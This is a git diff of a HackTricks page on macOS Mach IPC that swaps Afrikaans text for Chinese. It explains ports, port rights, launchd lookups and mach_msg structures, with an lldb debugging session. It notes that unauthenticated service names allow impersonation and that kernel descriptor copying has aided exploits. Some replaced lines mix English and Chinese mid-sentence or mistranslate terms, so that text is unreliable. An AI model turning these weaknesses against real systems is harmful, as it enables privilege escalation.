@@ -1,93 +1,94 @@
-# macOS IPC - Interproses Kommunikasie
+# macOS IPC - 进程间通信
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
-## Mach-boodskappe via Havens
+## Mach 消息通过端口
 
-### Basiese Inligting
+### 基本信息
 
-Mach gebruik **take** as die **kleinste eenheid** vir die deel van hulpbronne, en elke taak kan **verskeie drade** bevat. Hierdie **take en drade word 1:1 gekarteer na POSIX-prosesse en drade**.
+Mach 使用 **任务** 作为共享资源的 **最小单位**，每个任务可以包含 **多个线程**。这些 **任务和线程与 POSIX 进程和线程 1:1 映射**。
 
-Kommunikasie tussen take vind plaas via Mach Interproses Kommunikasie (IPC), wat eenrigting kommunikasiekanaal benut. **Boodskappe word oorgedra tussen hawens**, wat soortgelyk aan **boodskaprye** optree wat deur die kernel bestuur word.
+任务之间的通信通过 Mach 进程间通信 (IPC) 进行，利用单向通信通道。**消息在端口之间传输**，端口充当由内核管理的 **消息队列**。
 
-'n **Hawe** is die **basiese** element van Mach IPC. Dit kan gebruik word om **boodskappe te stuur en te ontvang**.
+**端口** 是 Mach IPC 的 **基本** 元素。它可以用来 **发送消息和接收** 消息。
 
-Elke proses het 'n **IPC-tabel**, waarin dit moontlik is om die **mach-hawens van die proses** te vind. Die naam van 'n mach-hawe is eintlik 'n nommer (‘n wyser na die kernel-voorwerp).
+每个进程都有一个 **IPC 表**，在其中可以找到 **进程的 mach 端口**。mach 端口的名称实际上是一个数字（指向内核对象的指针）。
 
-'n Proses kan ook 'n hawenaam met sekere regte **na 'n ander taak stuur** en die kernel sal hierdie inskrywing in die **IPC-tabel van die ander taak** laat verskyn.
+一个进程也可以将一个端口名称和一些权限 **发送到不同的任务**，内核会在 **另一个任务的 IPC 表** 中显示这个条目。
 
-### Haweregte
+### 端口权限
 
-Haweregte, wat definieer watter operasies 'n taak kan uitvoer, is sleutel tot hierdie kommunikasie. Die moontlike **haweregte** is ([definisies vanaf hier](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):
+端口权限定义了任务可以执行的操作，是这种通信的关键。可能的 **端口权限** 是（[定义来自这里](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)）：
 
-* **Ontvangsreg**, wat die ontvangs van boodskappe wat na die hawe gestuur is, moontlik maak. Mach-hawens is MPSC (meervoudige-vervaardiger, enkelverbruiker) rye, wat beteken dat daar slegs **een ontvangsreg vir elke hawe** in die hele stelsel kan wees (in teenstelling met pype, waar meervoudige prosesse almal lêerbeskrywers na die lees-einde van een pyp kan hê).
-* 'n **Taak met die Ontvangsreg** kan boodskappe ontvang en **Sendregte skep**, wat dit moontlik maak om boodskappe te stuur. Aanvanklik het slegs die **eie taak Ontvangsreg oor sy hawe**.
-* As die eienaar van die Ontvangsreg **sterf** of dit doodmaak, word die **sendreg nutteloos (dood naam)**.
-* **Sendreg**, wat dit moontlik maak om boodskappe na die hawe te stuur.
-* Die Sendreg kan **gekloneer** word sodat 'n taak wat 'n Sendreg besit, die reg kan kloon en dit aan 'n derde taak kan **toeken**.
-* Let daarop dat **haweregte** ook deur Mac-boodskappe **oorgedra** kan word.
-* **Send-eenkeer-reg**, wat dit moontlik maak om een boodskap na die hawe te stuur en dan te verdwyn.
-* Hierdie reg **kan nie** gekloneer word nie, maar dit kan **geskuif** word.
-* **Hawestelreg**, wat 'n _hawe stel_ aandui eerder as 'n enkele hawe. Die ontkoppeling van 'n boodskap van 'n hawe stel ontkoppel 'n boodskap van een van die hawens wat dit bevat. Hawestelle kan gebruik word om gelyktydig na verskeie hawens te luister, soos `select`/`poll`/`epoll`/`kqueue` in Unix.
-* **Dood naam**, wat nie 'n werklike hawe reg is nie, maar bloot 'n plekhouer. Wanneer 'n hawe vernietig word, verander alle bestaande hawe regte na die hawe in dood name.
+* **接收权限**，允许接收发送到端口的消息。Mach 端口是 MPSC（多个生产者，单个消费者）队列，这意味着在整个系统中每个端口只能有 **一个接收权限**（与管道不同，多个进程可以持有一个管道的读端文件描述符）。
+* 拥有 **接收权限** 的任务可以接收消息并 **创建发送权限**，允许其发送消息。最初只有 **自己的任务对其端口拥有接收权限**。
+* 如果接收权限的拥有者 **死亡** 或被杀死，**发送权限变得无用（死名称）**。
+* **发送权限**，允许向端口发送消息。
+* 发送权限可以被 **克隆**，因此拥有发送权限的任务可以克隆该权限并 **授予给第三个任务**。
+* 注意 **端口权限** 也可以通过 Mac 消息 **传递**。
+* **一次性发送权限**，允许向端口发送一条消息，然后消失。
+* 该权限 **不能** 被 **克隆**，但可以被 **移动**。
+* **端口集权限**，表示一个 _端口集_ 而不是单个端口。从端口集中出队一条消息会从其包含的一个端口中出队一条消息。端口集可以用来同时监听多个端口，类似于 Unix 中的 `select`/`poll`/`epoll`/`kqueue`。
+* **死名称**，这不是一个实际的端口权限，而只是一个占位符。当一个端口被销毁时，所有现有的端口权限都会变成死名称。
 
-**Take kan SEND-regte na ander oordra**, wat hulle in staat stel om boodskappe terug te stuur. **SEND-regte kan ook gekloneer word, sodat 'n taak die reg kan dupliseer en dit aan 'n derde taak kan gee**. Dit, saam met 'n bemiddelende proses wat bekend staan as die **opstartsdiens**, maak effektiewe kommunikasie tussen take moontlik.
+**任务可以将发送权限转移给其他任务**，使其能够发送消息。**发送权限也可以被克隆，因此一个任务可以复制并将权限授予第三个任务**。这与一个称为 **引导服务器** 的中介进程结合，使任务之间的有效通信成为可能。
 
-### Lêerhawens
+### 文件端口
 
-Lêerhawens maak dit moontlik om lêerbeskrywers in Mac-hawens in te sluit (deur Mach-haweregte te gebruik). Dit is moontlik om 'n `fileport` vanaf 'n gegewe FD te skep deur `fileport_makeport` te gebruik en 'n FD vanaf 'n lêerhawe te skep deur `fileport_makefd` te gebruik.
+文件端口允许在 Mac 端口中封装文件描述符（使用 Mach 端口权限）。可以使用 `fileport_makeport` 从给定的 FD 创建一个 `fileport`，并使用 `fileport_makefd` 从 fileport 创建一个 FD。
 
-### Die vestiging van 'n kommunikasie
+### 建立通信
 
-Soos voorheen genoem, is dit moontlik om regte te stuur deur Mach-boodskappe, maar jy **kan nie 'n reg stuur sonder om reeds 'n reg te hê** om 'n Mach-boodskap te stuur nie. Hoe word die eerste kommunikasie dan gevestig?
+如前所述，可以使用 Mach 消息发送权限，然而，您 **不能在没有发送 Mach 消息的权限的情况下发送权限**。那么，如何建立第一次通信呢？
 
-Hiervoor is die **opstartsdiens** (**launchd** in Mac) betrokke, aangesien **almal 'n SEND-reg na die opstartsdiens kan kry**, is dit moontlik om dit te vra vir 'n reg om 'n boodskap na 'n ander proses te stuur:
+为此，**引导服务器**（在 mac 中为 **launchd**）参与其中，因为 **任何人都可以获得引导服务器的发送权限**，可以请求它发送消息到另一个进程的权限：
 
-1. Taak **A** skep 'n **nuwe hawe**, kry die **ONTVANG reg** daaroor.
-2. Taak **A**, as die houer van die ONTVANG reg, **skep 'n SEND reg vir die hawe**.
-3. Taak **A** vestig 'n **verbindings** met die **opstartsdiens**, en **stuur dit die SEND reg** vir die hawe wat dit aan die begin geskep het.
-* Onthou dat enigeen 'n SEND reg na die opstartsdiens kan kry.
-4. Taak A stuur 'n `bootstrap_register` boodskap na die opstartsdiens om die gegewe hawe met 'n naam soos `com.apple.taska` te **assosieer**.
-5. Taak **B** interaksie met die **opstartsdiens** om 'n opstarts **soektog vir die diensnaam** (`bootstrap_lookup`) uit te voer. Sodat die opstartsdiens kan reageer, sal taak B 'n **SEND reg na 'n hawe wat dit voorheen geskep het** binne die soektog-boodskap stuur. As die soektog suksesvol is, **dupliseer die bediener die SEND reg** wat van Taak A ontvang is en **stuur dit na Taak B**.
-* Onthou dat enigeen 'n SEND reg na die opstartsdiens kan kry.
-6. Met hierdie SEND reg is **Taak B** in staat om 'n **boodskap na Taak A** te **stuur**.
-7. Vir 'n tweerigting kommunikasie skep taak **B** gewoonlik 'n nuwe hawe met 'n **ONTVANG** reg en 'n **SEND** reg, en gee die **SEND reg aan Taak A** sodat dit boodskappe aan TAASK B kan stuur (tweerigting kommunikasie).
+1. 任务 **A** 创建一个 **新端口**，获得该端口的 **接收权限**。
+2. 任务 **A**，作为接收权限的持有者，**为该端口生成一个发送权限**。
+3. 任务 **A** 与 **引导服务器** 建立 **连接**，并 **将其为最初生成的端口发送的发送权限** 发送给它。
+* 请记住，任何人都可以获得引导服务器的发送权限。
+4. 任务 A 向引导服务器发送 `bootstrap_register` 消息，以 **将给定端口与名称关联**，如 `com.apple.taska`。
+5. 任务 **B** 与 **引导服务器** 交互以执行服务名称的引导 **查找**（`bootstrap_lookup`）。因此，引导服务器可以响应，任务 B 将在查找消息中发送 **发送权限到它之前创建的端口**。如果查找成功，**服务器复制从任务 A 接收到的发送权限** 并 **将其传输给任务 B**。
+* 请记住，任何人都可以获得引导服务器的发送权限。
+6. 通过这个发送权限，**任务 B** 能够 **发送** 一条 **消息** **给任务 A**。
+7. 对于双向通信，通常任务 **B** 会生成一个带有 **接收** 权限和 **发送** 权限的新端口，并将 **发送权限授予任务 A**，以便它可以向任务 B 发送消息（双向通信）。
 
-Die opstartsdiens **kan nie die diensnaam autentiseer** wat deur 'n taak beweer word nie. Dit beteken 'n **taak** kan potensieel **enige stelseltaak naboots**, soos valse **goedkeuring van 'n outorisasiediensnaam** en dan elke versoek goedkeur.
+引导服务器 **无法验证** 任务声称的服务名称。这意味着一个 **任务** 可能会 **冒充任何系统任务**，例如虚假 **声称一个授权服务名称**，然后批准每个请求。
 
-Dan stoor Apple die **name van stelselverskafde dienste** in veilige konfigurasie lêers, geleë in **SIP-beskermde** gids: `/System/Library/LaunchDaemons` en `/System/Library/LaunchAgents`. Saam met elke diensnaam word ook die **geassosieerde binêre lêer gestoor**. Die opstartsdiens sal 'n **ONTVANG reg vir elkeen van hierdie diensname** skep en behou.
+然后，Apple 将 **系统提供服务的名称** 存储在安全配置文件中，位于 **SIP 保护** 目录：`/System/Library/LaunchDaemons` 和 `/System/Library/LaunchAgents`。每个服务名称旁边，**相关的二进制文件也被存储**。引导服务器将为这些服务名称创建并持有 **接收权限**。
 
-Vir hierdie voorgedefinieerde dienste, verskil die **soektogproses effens**. Wanneer 'n diensnaam opgesoek word, begin launchd die diens dinamies. Die nuwe werkstroom is as volg:
+对于这些预定义服务，**查找过程略有不同**。当查找服务名称时，launchd 动态启动该服务。新的工作流程如下：
 
-* Taak **B** inisieer 'n opstarts **soektog** vir 'n diensnaam.
-* **launchd** kontroleer of die taak loop en as dit nie is nie, **begin** dit.
-* Taak **A** (die diens) voer 'n **opstarts inligting** uit (`bootstrap_check_in()`). Hier skep die **opstarts** diens 'n SEND reg, behou dit, en **oorhandig die ONTVANG reg aan Taak A**.
-* launchd dupliseer die **SEND reg en stuur dit na Taak B**.
-* Taak **B** skep 'n nuwe hawe met 'n **ONTVANG** reg en 'n **SEND** reg, en gee die **SEND reg aan Taak A** (die diens) sodat dit boodskappe aan TAASK B kan stuur (tweerigting kommunikasie).
+* 任务 **B** 启动对服务名称的引导 **查找**。
+* **launchd** 检查任务是否正在运行，如果没有，则 **启动** 它。
+* 任务 **A**（服务）执行 **引导检查**（`bootstrap_check_in()`）。在这里，引导服务器创建一个发送权限，保留它，并 **将接收权限转移给任务 A**。
+* launchd 复制 **发送权限并将其发送给任务 B**。
+* 任务 **B** 生成一个带有 **接收** 权限和 **发送** 权限的新端口，并将 **发送权限授予任务 A**（服务），以便它可以向任务 B 发送消息（双向通信）。
 
-Hierdie proses geld egter slegs vir voorgedefinieerde stelseltake. Nie-stelsel take werk steeds soos aanvanklik beskryf, wat potensieel die moontlikheid vir nabootsing kan toelaat.
+然而，这个过程仅适用于预定义的系统任务。非系统任务仍然按照最初描述的方式操作，这可能会导致冒充。
 
 {% hint style="danger" %}
-Daarom behoort launchd nooit te bots nie, anders sal die hele stelsel bots.
+因此，launchd 绝不能崩溃，否则整个系统将崩溃。
 {% endhint %}
-### 'n Mach-boodskap
 
-[Vind meer inligting hier](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
+### 一个 Mach 消息
 
-Die `mach_msg`-funksie, essensieel 'n stelseloproep, word gebruik om Mach-boodskappe te stuur en te ontvang. Die funksie vereis dat die boodskap as die aanvanklike argument gestuur word. Hierdie boodskap moet begin met 'n `mach_msg_header_t`-struktuur, gevolg deur die werklike boodskapinhoud. Die struktuur word soos volg gedefinieer:
+[在这里找到更多信息](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
+
+`mach_msg` 函数，基本上是一个系统调用，用于发送和接收 Mach 消息。该函数要求将要发送的消息作为初始参数。该消息必须以 `mach_msg_header_t` 结构开始，后面跟着实际的消息内容。该结构定义如下：
 ```c
 typedef struct {
 mach_msg_bits_t               msgh_bits;
@@ -98,17 +99,17 @@ mach_port_name_t              msgh_voucher_port;
 mach_msg_id_t                 msgh_id;
 } mach_msg_header_t;
 ```
-Prosesse wat 'n _**ontvangsreg**_ besit, kan boodskappe op 'n Mach-poort ontvang. Omgekeerd word aan die **senders** 'n _**stuur**_ of 'n _**eenmalige stuur reg**_ toegeken. Die eenmalige stuur reg is uitsluitlik vir die stuur van 'n enkele boodskap, waarna dit ongeldig word.
+Processes possessing a _**receive right**_ can receive messages on a Mach port. Conversely, the **senders** are granted a _**send**_ or a _**send-once right**_. The send-once right is exclusively for sending a single message, after which it becomes invalid.
 
-Die aanvanklike veld **`msgh_bits`** is 'n bietjiekaart:
+The initial field **`msgh_bits`** is a bitmap:
 
-- Die eerste bit (mees betekenisvolle) word gebruik om aan te dui dat 'n boodskap kompleks is (meer hieroor hieronder)
-- Die 3de en 4de word deur die kernel gebruik
-- Die **5 minst betekenisvolle bits van die 2de byte** kan gebruik word vir **voucher**: 'n ander tipe poort om sleutel/waarde kombinasies te stuur.
-- Die **5 minst betekenisvolle bits van die 3de byte** kan gebruik word vir **plaaslike poort**
-- Die **5 minst betekenisvolle bits van die 4de byte** kan gebruik word vir **afgeleë poort**
+* First bit (most significative) is used to indicate that a message is complex (more on this below)
+* The 3rd and 4th are used by the kernel
+* The **5 least significant bits of the 2nd byte** from can be used for **voucher**: 另一种发送键/值组合的端口类型。
+* The **5 least significant bits of the 3rd byte** from can be used for **local port**
+* The **5 least significant bits of the 4th byte** from can be used for **remote port**
 
-Die tipes wat in die voucher, plaaslike en afgeleë poorte gespesifiseer kan word is (vanaf [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
+The types that can be specified in the voucher, local and remote ports are (from [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
 ```c
 #define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
 #define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
@@ -121,34 +122,34 @@ Die tipes wat in die voucher, plaaslike en afgeleë poorte gespesifiseer kan wor
 #define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
 #define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
 ```
-Byvoorbeeld, `MACH_MSG_TYPE_MAKE_SEND_ONCE` kan gebruik word om aan te dui dat 'n **stuur-eenmaal-reg** afgelei en oorgedra moet word vir hierdie poort. Dit kan ook gespesifiseer word as `MACH_PORT_NULL` om te voorkom dat die ontvanger kan antwoord.
+例如，`MACH_MSG_TYPE_MAKE_SEND_ONCE` 可用于 **指示** 应该为此端口派生并转移一个 **一次性发送权**。也可以指定 `MACH_PORT_NULL` 以防止接收者能够回复。
 
-Om 'n maklike **tweerigting kommunikasie** te bereik, kan 'n proses 'n **mach-poort** spesifiseer in die mach **boodskap kop** genoem die _antwoordpoort_ (**`msgh_local_port`**) waar die **ontvanger** van die boodskap 'n antwoord kan stuur op hierdie boodskap.
+为了实现简单的 **双向通信**，进程可以在 mach **消息头** 中指定一个 **mach 端口**，称为 _回复端口_ (**`msgh_local_port`**)，接收该消息的 **接收者** 可以 **发送回复**。
 
 {% hint style="success" %}
-Let daarop dat hierdie soort tweerigting kommunikasie gebruik word in XPC-boodskappe wat 'n antwoord verwag (`xpc_connection_send_message_with_reply` en `xpc_connection_send_message_with_reply_sync`). Maar **gewoonlik word verskillende poorte geskep** soos voorheen verduidelik om die tweerigting kommunikasie te skep.
+请注意，这种双向通信用于期望回复的 XPC 消息中（`xpc_connection_send_message_with_reply` 和 `xpc_connection_send_message_with_reply_sync`）。但 **通常会创建不同的端口**，如前所述，以创建双向通信。
 {% endhint %}
 
-Die ander velde van die boodskap kop is:
+消息头的其他字段包括：
 
-- `msgh_size`: die grootte van die hele pakkie.
-- `msgh_remote_port`: die poort waarop hierdie boodskap gestuur word.
-- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach\_vouchers.html).
-- `msgh_id`: die ID van hierdie boodskap, wat deur die ontvanger geïnterpreteer word.
+* `msgh_size`：整个数据包的大小。
+* `msgh_remote_port`：发送此消息的端口。
+* `msgh_voucher_port`：[mach 代金券](https://robert.sesek.com/2023/6/mach\_vouchers.html)。
+* `msgh_id`：此消息的 ID，由接收者解释。
 
 {% hint style="danger" %}
-Let daarop dat **mach-boodskappe oor 'n `mach-poort` gestuur word**, wat 'n **enkele ontvanger**, **veelvuldige stuurder** kommunikasiekanaal is wat in die mach-kernel ingebou is. **Meer as een proses** kan **boodskappe stuur** na 'n mach-poort, maar op enige punt kan slegs **'n enkele proses daarvan lees**.
+请注意，**mach 消息是通过 `mach port` 发送的**，这是一个 **单接收者**、**多个发送者** 的通信通道，内置于 mach 内核中。**多个进程** 可以 **向 mach 端口发送消息**，但在任何时候只有 **一个进程可以从中读取**。
 {% endhint %}
 
-Boodskappe word dan gevorm deur die **`mach_msg_header_t`** kop gevolg deur die **liggaam** en deur die **trailer** (indien enige) en dit kan toestemming verleen om daarop te antwoord. In hierdie gevalle hoef die kernel net die boodskap van die een taak na die ander oor te dra.
+消息由 **`mach_msg_header_t`** 头部、**主体** 和 **尾部**（如果有的话）组成，并且可以授予回复的权限。在这些情况下，内核只需将消息从一个任务传递到另一个任务。
 
-'n **Trailer** is **inligting wat deur die kernel by die boodskap gevoeg word** (kan nie deur die gebruiker ingestel word nie) wat aangevra kan word in die boodskap ontvangs met die vlae `MACH_RCV_TRAILER_<trailer_opt>` (daar is verskillende inligting wat aangevra kan word).
+**尾部** 是 **内核添加到消息中的信息**（用户无法设置），可以在消息接收时通过标志 `MACH_RCV_TRAILER_<trailer_opt>` 请求（可以请求不同的信息）。
 
-#### Complekse Boodskappe
+#### 复杂消息
 
-Daar is egter ander meer **komplekse** boodskappe, soos dié wat addisionele poortregte deurgee of geheue deel, waar die kernel ook hierdie voorwerpe na die ontvanger moet stuur. In hierdie gevalle is die mees beduidende bit van die kop `msgh_bits` ingestel.
+然而，还有其他更 **复杂** 的消息，例如传递额外端口权或共享内存的消息，在这些情况下，内核还需要将这些对象发送给接收者。在这种情况下，头部的最显著位 `msgh_bits` 被设置。
 
-Die moontlike beskrywers om deur te gee is gedefinieer in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
+可以传递的描述符在 [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) 中定义：
 ```c
 #define MACH_MSG_PORT_DESCRIPTOR                0
 #define MACH_MSG_OOL_DESCRIPTOR                 1
@@ -165,63 +166,63 @@ unsigned int                  pad3 : 24;
 mach_msg_descriptor_type_t    type : 8;
 } mach_msg_type_descriptor_t;
 ```
-In 32bits, al die beskrywers is 12B en die beskrywerstipe is in die 11de een. In 64 bits, varieer die groottes.
+在32位中，所有描述符都是12B，描述符类型在第11个。在64位中，大小各不相同。
 
 {% hint style="danger" %}
-Die kernel sal die beskrywers van die een taak na die ander kopieer, maar eerste **'n kopie in die kernel-geheue skep**. Hierdie tegniek, bekend as "Feng Shui", is misbruik in verskeie aanvalle om die **kernel data in sy geheue te laat kopieer** sodat 'n proses beskrywers na homself kan stuur. Dan kan die proses die boodskappe ontvang (die kernel sal hulle vrymaak).
+内核会将描述符从一个任务复制到另一个任务，但首先**在内核内存中创建一个副本**。这种技术被称为“风水”，在多个漏洞中被滥用，使得**内核在其内存中复制数据**，使得一个进程将描述符发送给自己。然后该进程可以接收消息（内核会释放它们）。
 
-Dit is ook moontlik om **poortregte na 'n kwesbare proses te stuur**, en die poortregte sal net in die proses verskyn (selfs al hanteer hy dit nie).
+也可以**将端口权限发送给一个易受攻击的进程**，端口权限将直接出现在该进程中（即使它没有处理这些权限）。
 {% endhint %}
 
 ### Mac Ports APIs
 
-Let daarop dat poorte aan die taaknaamruimte gekoppel is, sodat om 'n poort te skep of te soek, die taaknaamruimte ook ondersoek word (meer in `mach/mach_port.h`):
+请注意，端口与任务命名空间相关，因此要创建或搜索端口时，也会查询任务命名空间（更多内容见`mach/mach_port.h`）：
 
-* **`mach_port_allocate` | `mach_port_construct`**: **Skep** 'n poort.
-* `mach_port_allocate` kan ook 'n **poortstel** skep: ontvangsreg oor 'n groep poorte. Wanneer 'n boodskap ontvang word, word die poort aangedui waarvandaan dit afkomstig is.
-* `mach_port_allocate_name`: Verander die naam van die poort (standaard 32-bis integer)
-* `mach_port_names`: Kry poortname van 'n teiken
-* `mach_port_type`: Kry regte van 'n taak oor 'n naam
-* `mach_port_rename`: Hernoem 'n poort (soos dup2 vir FD's)
-* `mach_port_allocate`: Allokeer 'n nuwe ONTVANG, POORT_STEL of DOOD_NAAM
-* `mach_port_insert_right`: Skep 'n nuwe reg in 'n poort waar jy ONTVANG het
+* **`mach_port_allocate` | `mach_port_construct`**: **创建**一个端口。
+* `mach_port_allocate` 还可以创建一个**端口集**：对一组端口的接收权限。每当接收到消息时，会指明消息来自哪个端口。
+* `mach_port_allocate_name`: 更改端口的名称（默认是32位整数）
+* `mach_port_names`: 从目标获取端口名称
+* `mach_port_type`: 获取任务对名称的权限
+* `mach_port_rename`: 重命名端口（类似于FD的dup2）
+* `mach_port_allocate`: 分配一个新的RECEIVE、PORT_SET或DEAD_NAME
+* `mach_port_insert_right`: 在你拥有RECEIVE的端口中创建一个新的权限
 * `mach_port_...`
-* **`mach_msg`** | **`mach_msg_overwrite`**: Funksies wat gebruik word om **mach-boodskappe te stuur en te ontvang**. Die oorskrywingsweergawe maak dit moontlik om 'n ander buffer vir boodskaponvangst te spesifiseer (die ander weergawe sal dit net hergebruik).
+* **`mach_msg`** | **`mach_msg_overwrite`**: 用于**发送和接收mach消息**的函数。覆盖版本允许为消息接收指定不同的缓冲区（另一个版本将仅重用它）。
 
-### Debug mach\_msg
+### 调试 mach\_msg
 
-Aangesien die funksies **`mach_msg`** en **`mach_msg_overwrite`** diegene is wat gebruik word om boodskappe te stuur en te ontvang, sal dit moontlik wees om 'n breekpunt daarop te stel om die gestuurde en ontvangsboodskappe te ondersoek.
+由于**`mach_msg`**和**`mach_msg_overwrite`**是用于发送和接收消息的函数，因此在它们上设置断点将允许检查发送和接收的消息。
 
-Begin byvoorbeeld met die foutopsporing van enige toepassing wat jy kan foutopspoor aangesien dit **`libSystem.B` sal laai wat hierdie funksie sal gebruik**.
+例如，开始调试任何你可以调试的应用程序，因为它将加载**`libSystem.B`，该库将使用此函数**。
 
 <pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
-</strong>Breekpunt 1: waar = libsystem_kernel.dylib`mach_msg, adres = 0x00000001803f6c20
+</strong>断点 1: 位置 = libsystem_kernel.dylib`mach_msg, 地址 = 0x00000001803f6c20
 <strong>(lldb) r
-</strong>Proses 71019 begin: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
-Proses 71019 gestop
-* draad #1, tou = 'com.apple.main-thread', stoprede = breekpunt 1.1
-raam #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
+</strong>进程 71019 启动: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
+进程 71019 停止
+* 线程 #1, 队列 = 'com.apple.main-thread', 停止原因 = 断点 1.1
+帧 #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
 libsystem_kernel.dylib`mach_msg:
 ->  0x181d3ac20 &#x3C;+0>:  pacibsp
 0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
 0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
 0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
-Teiken 0: (SandboxedShellApp) gestop.
+目标 0: (SandboxedShellApp) 停止。
 <strong>(lldb) bt
-</strong>* draad #1, tou = 'com.apple.main-thread', stoprede = breekpunt 1.1
-* raam #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
-raam #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
-raam #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
-raam #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
-raam #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
-raam #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
-raam #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
-raam #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
-raam #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
-raam #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
+</strong>* 线程 #1, 队列 = 'com.apple.main-thread', 停止原因 = 断点 1.1
+* 帧 #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
+帧 #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
+帧 #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
+帧 #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
+帧 #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
+帧 #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
+帧 #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
+帧 #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
+帧 #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
+帧 #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
 </code></pre>
 
-Om die argumente van **`mach_msg`** te kry, ondersoek die registers. Dit is die argumente (van [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
+要获取**`mach_msg`**的参数，请检查寄存器。这些是参数（来自[mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)）：
 ```c
 __WATCHOS_PROHIBITED __TVOS_PROHIBITED
 extern mach_msg_return_t        mach_msg(
@@ -233,7 +234,7 @@ mach_port_name_t rcv_name,
 mach_msg_timeout_t timeout,
 mach_port_name_t notify);
 ```
-Kry die waardes uit die registre:
+获取注册表中的值：
 ```armasm
 reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
 x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
@@ -244,7 +245,7 @@ x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
